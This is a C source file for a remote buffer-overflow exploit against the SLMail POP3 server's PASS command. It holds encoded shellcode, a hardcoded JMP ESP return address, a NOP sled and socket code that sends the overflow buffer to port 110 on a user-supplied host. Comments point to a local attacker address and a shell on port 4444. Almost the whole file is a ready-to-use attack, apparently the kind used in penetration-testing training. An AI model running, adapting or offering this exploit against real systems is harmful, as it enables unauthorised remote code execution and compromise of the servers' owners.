/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team

- Fixed by Bluecough
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 443
// unsigned
// LHOST=10.11.0.11X --- You should change this shellcode
char shellcode[] =
"\xbd\x96\x22\x0e\xc5\xda\xcb\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x68\x12\x83\xe8\xfc\x03\xfe\x2c\xec\x30\x02\xd8\x72"
"\xba\xfa\x19\x13\x32\x1f\x28\x13\x20\x54\x1b\xa3\x22\x38\x90"
"\x48\x66\xa8\x23\x3c\xaf\xdf\x84\x8b\x89\xee\x15\xa7\xea\x71"
"\x96\xba\x3e\x51\xa7\x74\x33\x90\xe0\x69\xbe\xc0\xb9\xe6\x6d"
"\xf4\xce\xb3\xad\x7f\x9c\x52\xb6\x9c\x55\x54\x97\x33\xed\x0f"
"\x37\xb2\x22\x24\x7e\xac\x27\x01\xc8\x47\x93\xfd\xcb\x81\xed"
"\xfe\x60\xec\xc1\x0c\x78\x29\xe5\xee\x0f\x43\x15\x92\x17\x90"
"\x67\x48\x9d\x02\xcf\x1b\x05\xee\xf1\xc8\xd0\x65\xfd\xa5\x97"
"\x21\xe2\x38\x7b\x5a\x1e\xb0\x7a\x8c\x96\x82\x58\x08\xf2\x51"
"\xc0\x09\x5e\x37\xfd\x49\x01\xe8\x5b\x02\xac\xfd\xd1\x49\xb9"
"\x32\xd8\x71\x39\x5d\x6b\x02\x0b\xc2\xc7\x8c\x27\x8b\xc1\x4b"
"\x47\xa6\xb6\xc3\xb6\x49\xc7\xca\x7c\x1d\x97\x64\x54\x1e\x7c"
"\x74\x59\xcb\xd3\x24\xf5\xa4\x93\x94\xb5\x14\x7c\xfe\x39\x4a"
"\x9c\x01\x90\xe3\x37\xf8\x73\x06\xc3\x02\xf1\x7e\xd1\x02\xf8"
"\xc5\x5c\xe4\x90\x29\x09\xbf\x0c\xd3\x10\x4b\xac\x1c\x8f\x36"
"\xee\x97\x3c\xc7\xa1\x5f\x48\xdb\x56\x90\x07\x81\xf1\xaf\xbd"
"\xad\x9e\x22\x5a\x2d\xe8\x5e\xf5\x7a\xbd\x91\x0c\xee\x53\x8b"
"\xa6\x0c\xae\x4d\x80\x94\x75\xae\x0f\x15\xfb\x8a\x2b\x05\xc5"
"\x13\x70\x71\x99\x45\x2e\x2f\x5f\x3c\x80\x99\x09\x93\x4a\x4d"
"\xcf\xdf\x4c\x0b\xd0\x35\x3b\xf3\x61\xe0\x7a\x0c\x4d\x64\x8b"
"\x75\xb3\x14\x74\xac\x77\x24\x3f\xec\xde\xad\xe6\x65\x63\xb0"
"\x18\x50\xa0\xcd\x9a\x50\x59\x2a\x82\x11\x5c\x76\x04\xca\x2c"
"\xe7\xe1\xec\x83\x08\x20";

void exploit(int sock) {
      FILE *test;
      char *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[3501];
      char buf[3501];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90"
		       "\x90\x90";
      memset(buf, 0x00, 3500);
      memset(evil, 0x00, 3500);
      memset(evil, 0x43, 3450);
//      *(long*)&evil[2606] = 0x8f354a5f; //JMP ESP XP 7CB41020 FFE4 JMP ESP
      *(long*)&evil[2606] = 0x5f4a358f; //JMP ESP 5F4A358F FFE4 JMP ESP - Windows is Big Endian?
      ptr = &evil[2610];
//      ptr = ptr + &evil[2606]; // 2608
//      ptr = ptr + 652; // 2608
      memcpy(ptr, &nopsled, 16);
      ptr = &evil[2626];
      memcpy(ptr, &shellcode, 351);
//      *(long*)&evil[2606] = 0x8f354a5f; //JMP ESP XP 7CB41020 FFE4 JMP ESP



      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
